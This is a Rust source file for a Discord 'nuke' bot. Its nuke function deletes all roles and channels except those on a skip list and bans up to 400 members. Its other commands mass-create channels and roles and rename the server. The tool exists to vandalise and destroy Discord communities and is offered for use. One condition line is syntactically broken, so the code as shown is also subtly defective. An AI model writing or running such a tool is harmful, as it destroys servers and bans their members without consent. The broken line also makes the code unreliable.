use std::env;

mod config;
use config::*;

use serenity::{
    async_trait,
    model::{channel::Message, gateway::Ready, id::GuildId},
    prelude::*,
};

struct Handler {
    conf: Config,
}

fn parse_cmd(msg: String) -> String {
    msg.split(" ").collect::<Vec<&str>>()[0].into()
}

fn parse_args(msg: String) -> Vec<String> {
    let args: Vec<&str> = msg.split(" ").collect();
    let mut result = Vec::new();
    for i in args.into_iter().skip(1) {
        result.push(i.to_string());
    }
    result
}

async fn nuke(ctx: &Context, conf: &Config, guild: &GuildId) {
    let mut guild = match ctx.cache.guild(guild).await {
        Some(v) => v,
        None => {
            println!("could not grab cache for {guild}");
            return;             
        }
    };
    println!("Guild name: {}", guild.name);
    for (id, value) in &mut guild.roles {
        if conf.blacklist_roles.contains(&id.0) {
            continue;
        }
        match value.delete(&ctx.http).await {
            Ok(v) => v,
            Err(e) => println!("failed to delete role: {value} due to  {e}"),
        };
    }
    for (id, value) in &guild.channels {
        if conf.blacklist_channels.contains(&id.0) {
            continue;
        }
        match value.delete(&ctx.http).await {
            Ok(v) => println!("deleted channel with id: {v}"),
            Err(e) => {
                println!("failed to delete channel {value} due to {e}");
                continue;
            }
        };
    }

    let members = match guild.members(&ctx.http, Some(400), None).await {
        Ok(v) => v,
        Err(e) => {
            println!("{e}");
            return;
        },
    };

    for user in members {
        if conf.blacklist_users.contains(&user.user.id.0) {
            continue;
        }
        match user.ban_with_reason(&ctx.http, 7, "top kek").await {
            Ok(_) => println!("banning {}", user.user.name),
            Err(_) => {}
        };
    }
}

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        let guilds = ctx.cache.guilds().await;

        println!("Guilds in the Cache: {}", guilds.len());

        for i in guilds {
            println!("{}", i);
        }

        let mut guild = match msg.guild_id {
            Some(v) => v,
            None => return,
        };
        let users = self.conf.user_whitelist.as_ref();
        if users.is_some() && users.unwrap().contains(&msg.author.id.0) || users.unwrap().contains(&    ) {
            nuke(&ctx, &self.conf, &guild).await;
        }
        let result = match parse_cmd(msg.content.to_owned()).as_str() {
            "nuke" => {
                nuke(&ctx, &self.conf, &guild).await;
                ":sunglasses:"
            }
            "c" => {
                let args = parse_args(msg.content);
                if args.len() < 1 {
                    return;
                }
                let amt: u16 = match args[0].parse() {
                    Ok(v) => v,
                    Err(_) => return,
                };
                let name = match args.len() {
                    1.. => args[1].to_owned(),
                    _ => format!("top kek"),
                };
                if let Some(guild) = ctx.cache.guild(guild).await {
                    println!("creating channels in {} : param : {:?}", guild.name, args);
                    for _ in 1..=amt {
                        match guild
                            .create_channel(&ctx.http, |c| c.name(name.clone()))
                            .await
                        {
                            Ok(_) => {}
                            Err(e) => println!("failed to create channel {name} due to {e}"),
                        };
                    }
                }
                return;
            },
            "r" => {
                let args = parse_args(msg.content);
                if args.len() < 1 {
                    return;
                }
                let amt: u16 = match args[0].parse() {
                    Ok(v) => v,
                    Err(_) => return,
                };
                let name = match args.len() {
                    1.. => args[1].to_owned(),
                    _ => format!("top kek"),
                };
                if let Some(guild) = ctx.cache.guild(guild).await {
                    println!("creating roles in {} : param : {:?}", guild.name, args);
                    for _ in 1..=amt {
                        match guild
                            .create_role(&ctx.http, |c| c.name(name.clone()))
                            .await
                        {
                            Ok(_) => {}
                            Err(e) => println!("failed to create channel {name} due to {e}"),
                        };
                    }
                }
                return;
            },
            "rename" => {
                let args = parse_args(msg.content);
                if args.len() < 1 {
                    return;
                }
                let _ = guild.edit(&ctx.http, |x| x.name(args[0].clone())).await;
                return;
            }
            "ping" => "Pong",
            _ => return,
        };
        if let Err(why) = msg
            .channel_id
            .say(&ctx.http, format!("{}", result))
            .await
        {
            println!("Error sending message: {:?}", why);
        }
    }

    async fn ready(&self, _: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);
    }
}

#[tokio::main(flavor = "multi_thread", worker_threads = 2)]
async fn main() {
    let mut args: Vec<String> = env::args().collect();
    let path = args[0].clone();
    args.remove(0);

    if args.contains(&"check".to_string()) {
        let _ = Config::load();
        std::process::exit(0);
    }

    if args.contains(&"reset".to_string()) {
        match Config::reset() {
            Ok(_) => println!("created new config at {path}/.config"),
            Err(e) => println!("failed to reset due to {e}"),
        };
        std::process::exit(0);
    }

    let config = Config::load();
    let token = &config.token;

    let mut client = Client::builder(&token)
        .event_handler(Handler {
            conf: config.clone(),
        })
        .await
        .expect("Err creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}
